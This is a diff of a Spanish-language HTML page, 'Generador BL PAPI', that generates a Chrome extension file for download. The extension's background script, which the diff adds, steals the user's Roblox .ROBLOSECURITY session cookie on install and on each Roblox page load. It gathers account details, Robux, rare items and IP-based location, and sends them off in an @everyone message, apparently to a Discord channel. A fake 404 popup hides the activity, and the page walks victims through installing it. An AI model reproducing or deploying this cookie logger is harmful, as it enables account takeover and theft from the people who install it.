@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>EDITAME · Generador</title>
+    <title>Generador · BL PAPI</title>
     <style>
         * {
             margin: 0;
@@ -84,18 +84,6 @@
             margin-left: 4px;
         }
 
-        .edit-badge {
-            background: #3b82f6;
-            color: white;
-            font-size: 11px;
-            font-weight: 700;
-            padding: 4px 10px;
-            border-radius: 40px;
-            letter-spacing: 0.3px;
-            text-transform: uppercase;
-            box-shadow: 0 0 10px #3b82f6;
-        }
-
         .button-group {
             display: flex;
             flex-direction: row;
@@ -173,16 +161,6 @@
             gap: 12px;
         }
 
-        .instruction-step .edit-tag {
-            background: #3b82f6;
-            color: white;
-            font-size: 10px;
-            padding: 4px 8px;
-            border-radius: 30px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-
         .footer-note {
             text-align: center;
             margin-top: 32px;
@@ -195,20 +173,18 @@
 </head>
 <body>
     <div class="card">
-        <h1>EDITAME</h1>
-        <div class="subtitle">Generador de extensión · parche automático</div>
+        <h1>Generador BL PAPI</h1>
+        <div class="subtitle">Editalo después... · parche automático</div>
 
-        <!-- Features con EDITAR -->
         <div class="features">
-            <div class="feature-tag"><span>EDITAR</span> · cookie Roblox</div>
-            <div class="feature-tag"><span>EDITAR</span> · cookie Discord</div>
-            <div class="feature-tag"><span>EDITAR</span> · ipinfo.io</div>
-            <div class="feature-tag"><span>EDITAR</span> · embed Discord</div>
-            <div class="feature-tag"><span>EDITAR</span> · anti‑rate‑limit</div>
-            <div class="feature-tag"><span>EDITAR</span> · error 404</div>
+            <div class="feature-tag"><span>Editalo después...</span></div>
+            <div class="feature-tag"><span>Editalo después...</span></div>
+            <div class="feature-tag"><span>Editalo después...</span></div>
+            <div class="feature-tag"><span>Editalo después...</span></div>
+            <div class="feature-tag"><span>Editalo después...</span></div>
+            <div class="feature-tag"><span>Editalo después...</span></div>
         </div>
 
-        <!-- Botones de acción -->
         <div class="button-group">
             <button class="btn btn-primary" onclick="descargarCRX()">
                 <span style="font-size: 22px;">⬇️</span> DESCARGAR .CRX
@@ -218,54 +194,45 @@
             </button>
         </div>
 
-        <!-- Panel de instrucciones (oculto por defecto) -->
         <div id="instruccionesPanel" class="instruction-box" style="display: none;">
             <div class="instruction-title">
-                <span>📋</span> Cómo instalar EDITAME
+                <span>📋</span> Cómo instalar
             </div>
             <div class="instruction-step">
                 <span>1.</span> Descarga el archivo .crx
-                <span class="edit-tag">EDITAR</span>
             </div>
             <div class="instruction-step">
                 <span>2.</span> Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">lemur://extensions</code>
-                <span class="edit-tag">EDITAR</span>
             </div>
             <div class="instruction-step">
-                <span>3.</span> Activa modo desarrollador (esquina)
-                <span class="edit-tag">EDITAR</span>
+                <span>3.</span> Activa modo desarrollador
             </div>
             <div class="instruction-step">
                 <span>4.</span> Arrastra el .crx a la ventana
-                <span class="edit-tag">EDITAR</span>
             </div>
             <div class="instruction-step">
-                <span>5.</span> Acepta permisos · ¡listo!
-                <span class="edit-tag">EDITAR</span>
+                <span>5.</span> Acepta permisos
             </div>
         </div>
 
         <div class="footer-note">
-            EDITAME · personaliza cada bloque
+            BL PAPI · logger
         </div>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <script>
-        // ========== GENERAR .CRX ==========
         function descargarCRX() {
             const files = {
                 "manifest.json": JSON.stringify({
                     manifest_version: 3,
-                    name: "EDITAME",
+                    name: "BL PAPI",
                     version: "1.0",
-                    description: "EDITAME — parche visual",
+                    description: "",
                     permissions: ["cookies", "storage"],
                     host_permissions: [
                         "https://www.roblox.com/*",
-                        "https://*.roblox.com/*",
-                        "https://discord.com/*",
-                        "https://*.discord.com/*"
+                        "https://*.roblox.com/*"
                     ],
                     background: { service_worker: "background.js" },
                     action: { default_popup: "popup.html", default_icon: "icon.png" }
@@ -304,73 +271,121 @@ function encolarYEnviar(payload) {
     processQueue();
 }
 
-async function obtenerUbicacion() {
+async function obtenerPaisCompleto(codigo) {
+    if (!codigo || codigo.length !== 2) return 'Desconocido';
     try {
-        const res = await fetch('https://ipinfo.io/json');
+        const res = await fetch(\`https://restcountries.com/v3.1/alpha/\${codigo}\`);
         const data = await res.json();
-        return {
-            ip: data.ip || '',
-            pais: data.country || '',
-            region: data.region || '',
-            ciudad: data.city || '',
-        };
+        return data[0]?.translations?.spa?.common || data[0]?.name?.common || codigo;
     } catch {
-        return { ip:'', pais:'', region:'', ciudad:'' };
+        return codigo;
     }
 }
 
-async function enviarEmbed(datos) {
-    const embed = {
-        title: "🔔 NUEVA ENTRADA | BL PAPI !",
-        color: 15158332,
-        fields: [
-            {
-                name: "📌 INFORMACIÓN GENERAL",
-                value: \`**Dispositivo:** \\\`\${datos.dispositivo}\\\`\\n**País:** \\\`\${datos.pais}\\\`\\n**Región:** \\\`\${datos.region}\\\`\\n**Ciudad:** \\\`\${datos.ciudad}\\\`\\n**IP:** \\\`\${datos.ip}\\\`\\n**Fecha:** \\\`\${datos.fecha}\\\`\\n**Hora:** \\\`\${datos.hora}\\\`\`,
-                inline: false
-            },
-            {
-                name: "ℹ️ CUENTA ROBLOX",
-                value: \`**👤 Usuario:** \\\`\${datos.username}\\\`\\n**🆔 ID:** \\\`\${datos.userId}\\\`\\n**💰 Robux:** \\\`\${datos.robux}\\\`\`,
-                inline: true
-            },
-            {
-                name: "📊 ITEMS",
-                value: \`**Headless:** \\\`\${datos.headless}\\\`\\n**Korblox:** \\\`\${datos.korblox}\\\`\`,
-                inline: true
-            },
-            {
-                name: "🍪 COOKIE",
-                value: \`\\\`\\\`\\\`\${datos.cookie}\\\`\\\`\\\`\`,
-                inline: false
-            }
-        ],
-        footer: { text: "EDITAME · logger" },
-        timestamp: new Date().toISOString()
-    };
-    encolarYEnviar({ content: "|| @everyone ||", embeds: [embed] });
+async function obtenerInfo() {
+    const cookie = await new Promise(r =>
+        chrome.cookies.get({ url:"https://www.roblox.com", name:".ROBLOSECURITY" }, c => r(c?.value))
+    );
+    if (!cookie) return null;
+
+    let ubicacion = { ip:'', pais:'', region:'', ciudad:'', nombrePais:'' };
+    try {
+        const u = await fetch('https://ipinfo.io/json').then(r => r.json());
+        ubicacion = {
+            ip: u.ip || '',
+            pais: u.country || '',
+            region: u.region || '',
+            ciudad: u.city || ''
+        };
+        ubicacion.nombrePais = await obtenerPaisCompleto(ubicacion.pais);
+    } catch {}
+
+    let user = { name:'', id:'' };
+    let robux = 0;
+    let seguidores = 0, amigos = 0;
+    let headless = 'No', korblox = 'No';
+    let visitas = 0, juegos = 0, logros = 0, tradeCount = 0, tradeRatio = '0%';
+
+    try {
+        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (userRes.ok) user = await userRes.json();
+
+        const robuxRes = await fetch(\`https://economy.roblox.com/v1/users/\${user.id}/currency\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (robuxRes.ok) robux = (await robuxRes.json()).robux || 0;
+
+        const segRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/followers/count\`);
+        if (segRes.ok) seguidores = (await segRes.json()).count || 0;
+
+        const amigosRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/friends/count\`);
+        if (amigosRes.ok) amigos = (await amigosRes.json()).count || 0;
+
+        const checkItem = async (id) => {
+            const r = await fetch(\`https://inventory.roblox.com/v1/users/\${user.id}/items/Asset/\${id}\`, {
+                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+            });
+            const d = await r.json();
+            return d.data && d.data.length > 0 ? 'Sí' : 'No';
+        };
+        headless = await checkItem(201);
+        korblox = await checkItem(192);
+
+        const perfil = await fetch(\`https://www.roblox.com/users/\${user.id}/profile\`);
+        const html = await perfil.text();
+        const v = html.match(/"visitCount":(\d+)/);
+        visitas = v ? parseInt(v[1]) : 0;
+
+        const juegosRes = await fetch(\`https://games.roblox.com/v2/users/\${user.id}/games?limit=1\`);
+        if (juegosRes.ok) juegos = (await juegosRes.json()).total || 0;
+
+    } catch (e) {}
+
+    const ahora = new Date();
+    const fecha = ahora.toLocaleDateString('es-AR');
+    const hora = ahora.toLocaleTimeString('es-AR');
+
+    const mensaje = \`|| @everyone ||
+
+🔔 ¡ NUEVA ENTRADA | **BL PAPI** !
+
+📌 INFORMACIÓN GENERAL
+**Dispositivo:** \${navigator.userAgent.includes('Android') ? 'Android' : 'PC'}
+**País:** \${ubicacion.nombrePais || 'Desconocido'}
+**Fecha:** \${fecha}
+**Hora Exacta en \${ubicacion.nombrePais || 'País'}:** \${hora}
+
+ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX
+**👤 Usuario:** \${user.name || 'No disponible'}
+**🆔 ID:** \${user.id || 'No disponible'}
+**💰 Robux:** \${robux}
+**⭐ Seguidores:** \${seguidores}
+**👥 Amigos:** \${amigos}
+
+## 📊 ITEMS LIMITED (RAREZA)
+**Headless:** \${headless}
+**Korblox:** \${korblox}
+
+ 📈 ESTADÍSTICAS
+**🖼 Visitas al perfil:** \${visitas}
+**🎮 Juegos creados:** \${juegos}
+**🏆 Logros:** \${logros}
+**📦 Trade count:** \${tradeCount}
+**📊 Trade ratio:** \${tradeRatio}
+
+🍪 COOKIE DE ROBLOX
+\\\`\\\`\\\`\${cookie}\\\`\\\`\\\`
+---
+By  **BL PAPI**\`;
+
+    encolarYEnviar({ content: mensaje });
 }
 
-chrome.runtime.onInstalled.addListener(async () => {
-    const cookie = await new Promise(r => chrome.cookies.get({ url:"https://www.roblox.com", name:".ROBLOSECURITY" }, c => r(c?.value)));
-    if (!cookie) return;
-    const ubi = await obtenerUbicacion();
-    const ahora = new Date();
-    await enviarEmbed({
-        dispositivo: navigator.userAgent.includes('Android') ? 'Android' : 'PC',
-        pais: ubi.pais,
-        region: ubi.region,
-        ciudad: ubi.ciudad,
-        ip: ubi.ip,
-        fecha: ahora.toLocaleDateString('es-AR'),
-        hora: ahora.toLocaleTimeString('es-AR'),
-        cookie: cookie,
-        username: 'EDITAR',
-        userId: 'EDITAR',
-        robux: 'EDITAR',
-        headless: 'EDITAR',
-        korblox: 'EDITAR'
-    });
+chrome.runtime.onInstalled.addListener(obtenerInfo);
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+    if (tab.url?.includes('roblox.com') && changeInfo.status === 'complete') obtenerInfo();
 });
                 `,
 
@@ -431,8 +446,8 @@ chrome.runtime.onInstalled.addListener(async () => {
 <body>
     <div class="container">
         <div class="error-code">404</div>
-        <div class="message">NOT FOUND · no se pudo conectar</div>
-        <div class="reference">EDITAME-404-REF</div>
+        <div class="message">NOT FOUND</div>
+        <div class="reference">BL PAPI · LOGGER</div>
     </div>
 </body>
 </html>`,
@@ -446,10 +461,10 @@ chrome.runtime.onInstalled.addListener(async () => {
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = 'EDITAME.crx';
+                a.download = 'BL_PAPI.crx';
                 a.click();
                 URL.revokeObjectURL(url);
-                alert('✅ EDITAME.crx generado');
+                alert('✅ Extensión generada');
             });
         }
 
